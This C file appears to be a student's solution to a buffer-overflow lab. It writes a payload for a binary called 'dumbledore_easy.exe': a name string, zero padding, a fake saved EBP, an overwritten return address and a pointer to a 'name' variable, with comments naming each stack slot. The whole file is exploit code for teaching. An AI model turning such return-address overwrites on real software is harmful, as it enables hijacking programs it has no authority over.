// Wright Kim
// wdk7bj
// ./dumbledore_easy.exe

#include <stdio.h>
#include <string.h>

char attackString[] = "Wright Kim";

int main(){
	int i;
	// "Wright Kim"
	char *p = attackString;
	// padding buffer with 0x00
	unsigned char zero = 0x00;
	
	unsigned char ebp[] = {0xf8,0xef,0xff,0xbf};
	// $ebp + 4, to overwrite return address
	unsigned char ret[] = {0x0e,0x85,0x04,0x08};
	// $ebp + 8, variable "name"
	unsigned char name[] = {0x40,0xa0,0x04,0x08};
	
	// putchar from top of the stack to $ebp + 8
	// "Wright Kim"
	for(i = 0; i < sizeof(attackString); i++){
		putchar(*p);
		p++;
	}
	// pad 0x00
	for(i = 0; i < 121; i++){
		putchar(zero);
	}
	// $ebp
	for(i = 0; i < 4; i++){
		putchar(ebp[i]);
	}
	// $ ebp + 4 (ret addr)
	for(i = 0; i < 4; i++){
		putchar(ret[i]);
	}
	// $ebp + 8 (name)
	for(i = 0; i < 4; i++){
		putchar(name[i]);
	}
	
	return 1;
}
